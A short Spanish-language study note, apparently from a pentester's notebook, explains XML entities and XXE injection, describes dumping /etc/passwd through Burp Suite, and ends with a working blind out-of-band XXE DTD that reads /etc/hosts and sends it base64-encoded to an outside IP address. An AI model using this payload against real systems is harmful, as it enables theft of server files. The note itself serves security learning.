tags #new
XML, siglas en inglés de eXtensible Markup Language, traducido como 'Lenguaje de Marcado Extensible' o 'Lenguaje de Marcas Extensible', es un metalenguaje que permite definir lenguajes de marcas desarrollado por el World Wide Web Consortium utilizado para almacenar datos en forma legible.
## Entidades
Las entidades son una forma de reñresentar un elemento de datos, sin referenciar a los datos como tal, todo ello en un documento XML, los tipos de datos son:
	*exrtan (XXE)* : están alojadas en un dtd externo
	*Predefinididas* :  son los dtd's internos    por ej: (&lt; &gt;)
	![[Pasted image 20240606090541.png]]
	Si metemos en un xtml un <!DOCTYPE foo [<!ENTITY myname "Tubi">]>
	estamos registrando la entidad como "tubi"
	![[Pasted image 20240606091410.png]]
	En este Burpsuite, la página toma lo que hay dentro de la etiqueta "&myName;" y esta reflejando la etiqueta que definismo en otra de estas como "ENTITY myname"
Ahora inyectamos el xxm Entity injection para que dumpeé el etc passwd:
![[Pasted image 20240606092030.png]]
Acá te muestra el output de una pero muchas veces no sucede y entre en juego las oob (out of band interaction) y acá entra en juego las external dtd
## XXE OOB 
Que son blind, podemos ejecutarla con este script 
```dtd
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/hosts">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://172.27.94.214/?file=%file;'>">
%eval;
%exfil;
```